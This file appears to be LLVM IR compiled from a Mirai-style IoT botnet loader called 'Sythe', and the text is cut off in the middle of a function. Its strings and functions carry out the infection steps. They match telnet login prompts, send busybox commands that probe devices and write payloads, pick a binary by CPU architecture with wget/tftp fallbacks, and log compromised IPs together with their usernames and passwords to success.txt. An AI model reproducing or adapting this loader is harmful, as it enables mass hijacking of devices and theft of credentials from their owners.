; ModuleID = 'host/ir_O0/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.elf_hdr = type { [16 x i8], i16, i16, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common global %struct._IO_FILE* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 9
  store i16 0, i16* %7, align 8
  %8 = call i64 @time(i64* null) #5
  %9 = load %struct.connection*, %struct.connection** %2, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %9, i32 0, i32 6
  store i64 %8, i64* %10, align 8
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 10
  store i16 10, i16* %12, align 2
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 5
  store i32 0, i32* %14, align 4
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 7
  store i32 1, i32* %16, align 8
  %17 = load %struct.connection*, %struct.connection** %2, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 12
  store i8 0, i8* %18, align 1
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 11
  store i8 1, i8* %20, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 2
  store %struct.binary* null, %struct.binary** %22, align 8
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 5
  store i32 0, i32* %24, align 4
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 0
  %27 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %26) #5
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 11
  %8 = load i8, i8* %7, align 4
  %9 = icmp ne i8 %8, 0
  br i1 %9, label %10, label %140

; <label>:10:                                     ; preds = %1
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 8
  %13 = getelementptr inbounds %struct.anon, %struct.anon* %12, i32 0, i32 0
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 512, i32 4, i1 false)
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 8
  %17 = getelementptr inbounds %struct.anon, %struct.anon* %16, i32 0, i32 1
  store i32 0, i32* %17, align 4
  %18 = load %struct.connection*, %struct.connection** %2, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 6
  store i64 0, i64* %19, align 8
  %20 = load %struct.connection*, %struct.connection** %2, align 8
  %21 = getelementptr inbounds %struct.connection, %struct.connection* %20, i32 0, i32 11
  store i8 0, i8* %21, align 4
  %22 = load %struct.connection*, %struct.connection** %2, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 13
  store i8 0, i8* %23, align 2
  %24 = load %struct.connection*, %struct.connection** %2, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 14
  store i8 0, i8* %25, align 1
  %26 = load %struct.connection*, %struct.connection** %2, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8192, i32 8, i1 false)
  %29 = load %struct.connection*, %struct.connection** %2, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 9
  store i16 0, i16* %30, align 8
  %31 = load %struct.connection*, %struct.connection** %2, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 1
  %33 = load %struct.server*, %struct.server** %32, align 8
  %34 = icmp eq %struct.server* %33, null
  br i1 %34, label %35, label %37

; <label>:35:                                     ; preds = %10
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))
  br label %163

; <label>:37:                                     ; preds = %10
  %38 = load %struct.connection*, %struct.connection** %2, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 12
  %40 = load i8, i8* %39, align 1
  %41 = icmp ne i8 %40, 0
  br i1 %41, label %42, label %133

; <label>:42:                                     ; preds = %37
  %43 = load %struct.connection*, %struct.connection** %2, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 1
  %45 = load %struct.server*, %struct.server** %44, align 8
  %46 = getelementptr inbounds %struct.server, %struct.server* %45, i32 0, i32 7
  %47 = atomicrmw add i32* %46, i32 1 seq_cst
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %49 = load %struct.connection*, %struct.connection** %2, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 3
  %51 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %50, i32 0, i32 4
  %52 = load i32, i32* %51, align 8
  %53 = and i32 %52, 255
  %54 = load %struct.connection*, %struct.connection** %2, align 8
  %55 = getelementptr inbounds %struct.connection, %struct.connection* %54, i32 0, i32 3
  %56 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %55, i32 0, i32 4
  %57 = load i32, i32* %56, align 8
  %58 = lshr i32 %57, 8
  %59 = and i32 %58, 255
  %60 = load %struct.connection*, %struct.connection** %2, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 3
  %62 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %61, i32 0, i32 4
  %63 = load i32, i32* %62, align 8
  %64 = lshr i32 %63, 16
  %65 = and i32 %64, 255
  %66 = load %struct.connection*, %struct.connection** %2, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 3
  %68 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %67, i32 0, i32 4
  %69 = load i32, i32* %68, align 8
  %70 = lshr i32 %69, 24
  %71 = and i32 %70, 255
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 3
  %74 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %73, i32 0, i32 5
  %75 = load i16, i16* %74, align 4
  %76 = zext i16 %75 to i32
  %77 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %76)
  %78 = load %struct.connection*, %struct.connection** %2, align 8
  %79 = getelementptr inbounds %struct.connection, %struct.connection* %78, i32 0, i32 3
  %80 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %79, i32 0, i32 0
  %81 = getelementptr inbounds [32 x i8], [32 x i8]* %80, i32 0, i32 0
  %82 = load %struct.connection*, %struct.connection** %2, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 3
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 1
  %85 = getelementptr inbounds [32 x i8], [32 x i8]* %84, i32 0, i32 0
  %86 = load %struct.connection*, %struct.connection** %2, align 8
  %87 = getelementptr inbounds %struct.connection, %struct.connection* %86, i32 0, i32 3
  %88 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %87, i32 0, i32 2
  %89 = getelementptr inbounds [6 x i8], [6 x i8]* %88, i32 0, i32 0
  %90 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %48, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i32 0, i32 0), i32 %53, i32 %59, i32 %65, i32 %71, i32 %77, i8* %81, i8* %85, i8* %89)
  %91 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0))
  store %struct._IO_FILE* %91, %struct._IO_FILE** @fileeeee, align 8
  %92 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %93 = load %struct.connection*, %struct.connection** %2, align 8
  %94 = getelementptr inbounds %struct.connection, %struct.connection* %93, i32 0, i32 3
  %95 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %94, i32 0, i32 4
  %96 = load i32, i32* %95, align 8
  %97 = and i32 %96, 255
  %98 = load %struct.connection*, %struct.connection** %2, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 3
  %100 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = lshr i32 %101, 8
  %103 = and i32 %102, 255
  %104 = load %struct.connection*, %struct.connection** %2, align 8
  %105 = getelementptr inbounds %struct.connection, %struct.connection* %104, i32 0, i32 3
  %106 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %105, i32 0, i32 4
  %107 = load i32, i32* %106, align 8
  %108 = lshr i32 %107, 16
  %109 = and i32 %108, 255
  %110 = load %struct.connection*, %struct.connection** %2, align 8
  %111 = getelementptr inbounds %struct.connection, %struct.connection* %110, i32 0, i32 3
  %112 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %111, i32 0, i32 4
  %113 = load i32, i32* %112, align 8
  %114 = lshr i32 %113, 24
  %115 = and i32 %114, 255
  %116 = load %struct.connection*, %struct.connection** %2, align 8
  %117 = getelementptr inbounds %struct.connection, %struct.connection* %116, i32 0, i32 3
  %118 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %117, i32 0, i32 5
  %119 = load i16, i16* %118, align 4
  %120 = zext i16 %119 to i32
  %121 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %120)
  %122 = load %struct.connection*, %struct.connection** %2, align 8
  %123 = getelementptr inbounds %struct.connection, %struct.connection* %122, i32 0, i32 3
  %124 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %123, i32 0, i32 0
  %125 = getelementptr inbounds [32 x i8], [32 x i8]* %124, i32 0, i32 0
  %126 = load %struct.connection*, %struct.connection** %2, align 8
  %127 = getelementptr inbounds %struct.connection, %struct.connection* %126, i32 0, i32 3
  %128 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %127, i32 0, i32 1
  %129 = getelementptr inbounds [32 x i8], [32 x i8]* %128, i32 0, i32 0
  %130 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %92, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0), i32 %97, i32 %103, i32 %109, i32 %115, i32 %121, i8* %125, i8* %129)
  %131 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %132 = call i32 @fclose(%struct._IO_FILE* %131)
  br label %139

; <label>:133:                                    ; preds = %37
  %134 = load %struct.connection*, %struct.connection** %2, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 1
  %136 = load %struct.server*, %struct.server** %135, align 8
  %137 = getelementptr inbounds %struct.server, %struct.server* %136, i32 0, i32 8
  %138 = atomicrmw add i32* %137, i32 1 seq_cst
  br label %139

; <label>:139:                                    ; preds = %133, %42
  br label %140

; <label>:140:                                    ; preds = %139, %1
  %141 = load %struct.connection*, %struct.connection** %2, align 8
  %142 = getelementptr inbounds %struct.connection, %struct.connection* %141, i32 0, i32 7
  store i32 0, i32* %142, align 8
  %143 = load %struct.connection*, %struct.connection** %2, align 8
  %144 = getelementptr inbounds %struct.connection, %struct.connection* %143, i32 0, i32 4
  %145 = load i32, i32* %144, align 8
  %146 = icmp ne i32 %145, -1
  br i1 %146, label %147, label %159

; <label>:147:                                    ; preds = %140
  %148 = load %struct.connection*, %struct.connection** %2, align 8
  %149 = getelementptr inbounds %struct.connection, %struct.connection* %148, i32 0, i32 4
  %150 = load i32, i32* %149, align 8
  %151 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %150)
  %152 = load %struct.connection*, %struct.connection** %2, align 8
  %153 = getelementptr inbounds %struct.connection, %struct.connection* %152, i32 0, i32 4
  store i32 -1, i32* %153, align 8
  %154 = load %struct.connection*, %struct.connection** %2, align 8
  %155 = getelementptr inbounds %struct.connection, %struct.connection* %154, i32 0, i32 1
  %156 = load %struct.server*, %struct.server** %155, align 8
  %157 = getelementptr inbounds %struct.server, %struct.server* %156, i32 0, i32 1
  %158 = atomicrmw sub i32* %157, i32 1 seq_cst
  br label %159

; <label>:159:                                    ; preds = %147, %140
  %160 = load %struct.connection*, %struct.connection** %2, align 8
  %161 = getelementptr inbounds %struct.connection, %struct.connection* %160, i32 0, i32 0
  %162 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %161) #5
  br label %163

; <label>:163:                                    ; preds = %159, %35
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @printf(i8*, ...) #3

declare i32 @ntohs(...) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @close(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %137, %41, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 9
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = icmp slt i32 %12, %16
  br i1 %17, label %18, label %138

; <label>:18:                                     ; preds = %11
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  br i1 %22, label %23, label %24

; <label>:23:                                     ; preds = %18
  br label %138

; <label>:24:                                     ; preds = %18
  %25 = load i8*, i8** %4, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 255
  br i1 %28, label %29, label %136

; <label>:29:                                     ; preds = %24
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = load i8*, i8** %4, align 8
  %32 = call signext i8 @can_consume(%struct.connection* %30, i8* %31, i32 1)
  %33 = icmp ne i8 %32, 0
  br i1 %33, label %35, label %34

; <label>:34:                                     ; preds = %29
  br label %138

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %4, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 255
  br i1 %40, label %41, label %46

; <label>:41:                                     ; preds = %35
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 2
  store i8* %43, i8** %4, align 8
  %44 = load i32, i32* %3, align 4
  %45 = add nsw i32 %44, 2
  store i32 %45, i32* %3, align 4
  br label %11

; <label>:46:                                     ; preds = %35
  %47 = load i8*, i8** %4, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 253
  br i1 %51, label %52, label %82

; <label>:52:                                     ; preds = %46
  %53 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %54 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %54, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %55 = load %struct.connection*, %struct.connection** %2, align 8
  %56 = load i8*, i8** %4, align 8
  %57 = call signext i8 @can_consume(%struct.connection* %55, i8* %56, i32 2)
  %58 = icmp ne i8 %57, 0
  br i1 %58, label %60, label %59

; <label>:59:                                     ; preds = %52
  br label %138

; <label>:60:                                     ; preds = %52
  %61 = load i8*, i8** %4, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 2
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 31
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %60
  br label %83

; <label>:67:                                     ; preds = %60
  %68 = load i8*, i8** %4, align 8
  %69 = getelementptr inbounds i8, i8* %68, i64 3
  store i8* %69, i8** %4, align 8
  %70 = load i32, i32* %3, align 4
  %71 = add nsw i32 %70, 3
  store i32 %71, i32* %3, align 4
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 4
  %74 = load i32, i32* %73, align 8
  %75 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %76 = call i64 @send(i32 %74, i8* %75, i64 3, i32 16384)
  %77 = load %struct.connection*, %struct.connection** %2, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 4
  %79 = load i32, i32* %78, align 8
  %80 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %81 = call i64 @send(i32 %79, i8* %80, i64 9, i32 16384)
  br label %134

; <label>:82:                                     ; preds = %46
  br label %83

; <label>:83:                                     ; preds = %82, %66
  %84 = load %struct.connection*, %struct.connection** %2, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call signext i8 @can_consume(%struct.connection* %84, i8* %85, i32 2)
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %89, label %88

; <label>:88:                                     ; preds = %83
  br label %138

; <label>:89:                                     ; preds = %83
  store i32 0, i32* %5, align 4
  br label %90

; <label>:90:                                     ; preds = %121, %89
  %91 = load i32, i32* %5, align 4
  %92 = icmp slt i32 %91, 3
  br i1 %92, label %93, label %124

; <label>:93:                                     ; preds = %90
  %94 = load i8*, i8** %4, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 253
  br i1 %100, label %101, label %106

; <label>:101:                                    ; preds = %93
  %102 = load i8*, i8** %4, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  store i8 -4, i8* %105, align 1
  br label %120

; <label>:106:                                    ; preds = %93
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 251
  br i1 %113, label %114, label %119

; <label>:114:                                    ; preds = %106
  %115 = load i8*, i8** %4, align 8
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  store i8 -3, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %114, %106
  br label %120

; <label>:120:                                    ; preds = %119, %101
  br label %121

; <label>:121:                                    ; preds = %120
  %122 = load i32, i32* %5, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %5, align 4
  br label %90

; <label>:124:                                    ; preds = %90
  %125 = load %struct.connection*, %struct.connection** %2, align 8
  %126 = getelementptr inbounds %struct.connection, %struct.connection* %125, i32 0, i32 4
  %127 = load i32, i32* %126, align 8
  %128 = load i8*, i8** %4, align 8
  %129 = call i64 @send(i32 %127, i8* %128, i64 3, i32 16384)
  %130 = load i8*, i8** %4, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 3
  store i8* %131, i8** %4, align 8
  %132 = load i32, i32* %3, align 4
  %133 = add nsw i32 %132, 3
  store i32 %133, i32* %3, align 4
  br label %134

; <label>:134:                                    ; preds = %124, %67
  br label %135

; <label>:135:                                    ; preds = %134
  br label %136

; <label>:136:                                    ; preds = %135, %24
  br label %137

; <label>:137:                                    ; preds = %136
  br label %11

; <label>:138:                                    ; preds = %88, %59, %34, %23, %11
  %139 = load i32, i32* %3, align 4
  ret i32 %139
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.connection*, i8*, i32) #0 {
  %4 = alloca %struct.connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %4, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.connection*, %struct.connection** %4, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 9
  %13 = load i16, i16* %12, align 8
  %14 = zext i16 %13 to i32
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %10, i64 %15
  store i8* %16, i8** %7, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %7, align 8
  %22 = icmp ult i8* %20, %21
  %23 = zext i1 %22 to i32
  %24 = trunc i32 %23 to i8
  ret i8 %24
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_login_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
